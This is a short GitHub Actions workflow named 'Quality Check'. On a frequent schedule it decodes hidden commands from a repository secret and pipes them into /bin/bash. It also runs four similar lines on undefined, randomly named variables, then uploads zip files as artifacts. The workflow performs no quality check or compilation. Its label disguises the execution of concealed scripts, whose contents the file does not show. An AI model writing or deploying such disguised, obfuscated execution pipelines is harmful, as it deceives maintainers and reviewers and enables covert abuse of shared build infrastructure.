name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '39 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          cz960: ${{ secrets.cz960 }}
        run: |
          printf '%s' "$cz960" | jq -r .met95062 | /bin/bash
          printf '%s' "$y0129" | jq -r .qvv9 | /bin/bash
          printf '%s' "$m283" | jq -r .arlfj79058 | /bin/bash
          printf '%s' "$xe6429" | jq -r .qglu28 | /bin/bash
          echo $pqa8 | jq -r .z275 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: oyxuC0at
          path: "*.zip"
          retention-days: 1
